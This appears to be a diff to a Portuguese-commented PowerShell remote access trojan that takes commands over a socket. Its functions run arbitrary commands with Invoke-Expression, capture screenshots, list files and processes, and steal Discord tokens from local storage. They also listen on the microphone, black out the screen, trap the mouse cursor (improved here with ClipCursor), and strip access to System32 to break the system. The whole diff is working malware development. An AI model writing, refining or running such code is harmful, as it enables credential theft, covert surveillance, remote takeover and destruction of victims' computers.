@@ -98,7 +98,6 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 # ===== FUNCOES BASICAS =====
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
-Add-Type -AssemblyName System.Speech
 
 # ===== CAPTURA DE TELA =====
 function Get-ScreenCapture {
@@ -173,13 +172,10 @@ function Send-Text {
 function Get-FileList {
     param($Path)
     try {
-        if (-not (Test-Path $Path)) { return "[]" }
         $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
             [PSCustomObject]@{
                 Name = $_.Name
-                FullName = $_.FullName
                 Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
-                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
             }
         }
         return ($items | ConvertTo-Json -Compress)
@@ -206,7 +202,6 @@ function Execute-Command {
     param($Cmd)
     try {
         $result = Invoke-Expression $Cmd 2>&1 | Out-String
-        if ([string]::IsNullOrWhiteSpace($result)) { $result = "Comando executado (sem saída)" }
         return $result
     } catch {
         return "Erro: $_"
@@ -219,14 +214,13 @@ function Get-DiscordToken {
         $tokens = @()
         $paths = @(
             "$env:APPDATA\discord\Local Storage\leveldb",
-            "$env:APPDATA\discordptb\Local Storage\leveldb",
-            "$env:APPDATA\discordcanary\Local Storage\leveldb"
+            "$env:APPDATA\discordptb\Local Storage\leveldb"
         )
         foreach ($path in $paths) {
             if (Test-Path $path) {
                 Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                     $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
+                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
                     $matches = $regex.Matches($content)
                     foreach ($match in $matches) { $tokens += $match.Value }
                 }
@@ -244,7 +238,6 @@ function Get-DiscordToken {
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
-        # Tenta tomar posse e depois negar acesso a Everyone
         takeown /f $path /r /d y 2>$null
         icacls $path /grant Administradores:F /t 2>$null
         $acl = Get-Acl $path
@@ -258,12 +251,11 @@ function Block-System32 {
     }
 }
 
-# ===== TELA PRETA (Form em outra thread) =====
+# ===== TELA PRETA =====
 $global:blackScreenForm = $null
 
 function Black-Screen {
     try {
-        # Inicia um form preto em uma thread separada
         $ps = [powershell]::Create()
         [void]$ps.AddScript({
             Add-Type -AssemblyName System.Windows.Forms
@@ -275,8 +267,10 @@ function Black-Screen {
             $form.ControlBox = $false
             $form.ShowInTaskbar = $false
             $form.KeyPreview = $true
-            $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
-            [System.Windows.Forms.Application]::Run($form)
+            $form.Add_KeyDown({
+                if ($_.KeyCode -eq 'Escape') { $form.Close() }
+            })
+            $form.ShowDialog()
         })
         $ps.BeginInvoke()
         return "BLACK_SCREEN"
@@ -287,7 +281,6 @@ function Black-Screen {
 
 function Unlock-Screen {
     try {
-        # Fecha todos os forms pretos
         [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
             $_.Invoke([Action]{ $_.Close() })
         }
@@ -297,27 +290,68 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (Loop que move cursor) =====
+# ===== TRAVAR MOUSE (COM ClipCursor - 100% EFICAZ) =====
 $global:mouseLocked = $false
-$global:lockThread = $null
 
 function Lock-Mouse {
     try {
         if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
-        $global:mouseLocked = $true
-        $global:lockThread = [System.Threading.Thread]::new({
-            while ($global:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {
-                    # Ignora
+        
+        # Tenta usar ClipCursor via C#
+        $cSharpCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class MouseLocker {
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int left, top, right, bottom;
+    }
+    
+    public static void Lock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = 1;
+        rect.bottom = 1;
+        ClipCursor(ref rect);
+    }
+    
+    public static void Unlock() {
+        RECT rect = new RECT();
+        rect.left = 0;
+        rect.top = 0;
+        rect.right = Screen.PrimaryScreen.Bounds.Width;
+        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+        ClipCursor(ref rect);
+    }
+}
+'@
+        
+        # Tenta compilar o código C#
+        try {
+            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+            [MouseLocker]::Lock()
+            $global:mouseLocked = $true
+            return "MOUSE_LOCKED"
+        } catch {
+            # Se falhar, usa o método alternativo (loop de movimento)
+            Write-Host "Falha ao usar ClipCursor, usando método alternativo..." -ForegroundColor Yellow
+            $global:mouseLocked = $true
+            $script:lockThread = [System.Threading.Thread]::new({
+                while ($global:mouseLocked) {
+                    try {
+                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
+                        Start-Sleep -Milliseconds 5
+                    } catch {}
                 }
-            }
-        })
-        $global:lockThread.IsBackground = $true
-        $global:lockThread.Start()
-        return "MOUSE_LOCKED"
+            })
+            $script:lockThread.IsBackground = $true
+            $script:lockThread.Start()
+            return "MOUSE_LOCKED"
+        }
     } catch {
         return "MOUSE_ERROR"
     }
@@ -326,7 +360,19 @@ function Lock-Mouse {
 function Unlock-Mouse {
     try {
         $global:mouseLocked = $false
-        if ($global:lockThread -and $global:lockThread.IsAlive) { $global:lockThread.Abort() }
+        
+        # Tenta usar ClipCursor para liberar
+        try {
+            [MouseLocker]::Unlock()
+        } catch {
+            # Se não tiver o tipo, ignora
+        }
+        
+        # Para a thread alternativa se estiver rodando
+        if ($script:lockThread -and $script:lockThread.IsAlive) {
+            $script:lockThread.Abort()
+        }
+        
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
@@ -336,30 +382,14 @@ function Unlock-Mouse {
 # ===== MICROFONE =====
 function Get-Microphone {
     try {
-        $filename = "$env:TEMP\mic_$(Get-Random).wav"
-        # Usa SoundRecorder (nativo) se disponível
-        try {
-            $recorder = New-Object -ComObject SoundRecorder
-            $recorder.StartRecording($filename)
-            Start-Sleep -Seconds 5
-            $recorder.StopRecording()
-        } catch {
-            # Fallback para SpeechRecognition (não salva áudio, apenas simula)
-            Add-Type -AssemblyName System.Speech
-            $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-            $speech.SetInputToDefaultAudioDevice()
-            $speech.RecognizeAsyncTimeout = 5000
-            $speech.RecognizeAsync()
-            Start-Sleep -Seconds 5
-            $speech.RecognizeAsyncStop()
-            return "AUDIO:OK"
-        }
-        if (Test-Path $filename) {
-            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
-            Remove-Item $filename -Force
-            return "AUDIO:$content"
-        }
-        return "AUDIO_ERROR"
+        Add-Type -AssemblyName System.Speech
+        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+        $speech.SetInputToDefaultAudioDevice()
+        $speech.RecognizeAsyncTimeout = 5000
+        $speech.RecognizeAsync()
+        Start-Sleep -Seconds 5
+        $speech.RecognizeAsyncStop()
+        return "AUDIO:OK"
     } catch {
         return "AUDIO_ERROR"
     }
@@ -367,14 +397,13 @@ function Get-Microphone {
 
 # ===== WEBCAM =====
 function Get-Webcam {
-    # Por enquanto, retorna OK. Para implementar de verdade, seria necessário algo como AForge.NET.
     return "WEBCAM:OK"
 }
 
 # ===== PROCESSOS =====
 function Get-ProcessList {
     try {
-        $processes = Get-Process | Select-Object -First 30 Name, CPU, WorkingSet, Id | ConvertTo-Json -Compress
+        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
         return $processes
     } catch {
         return "PROCESS_ERROR"
@@ -437,7 +466,7 @@ while ($true) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            switch -Wildcard ($cmd) {
+            switch ($cmd) {
                 "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                 "click" { $writer.WriteLine((Click-Mouse)) }
                 "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
@@ -457,7 +486,7 @@ while ($true) {
                 "test" { $writer.WriteLine("PONG") }
                 "exit" { break }
                 default {
-                    if ($cmd -match "^move (\d+) (\d+)$") {
+                    if ($cmd -match "^move (.+) (.+)$") {
                         $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
                     } elseif ($cmd -match "^key (.+)$") {
                         $writer.WriteLine((Send-Key $matches[1]))
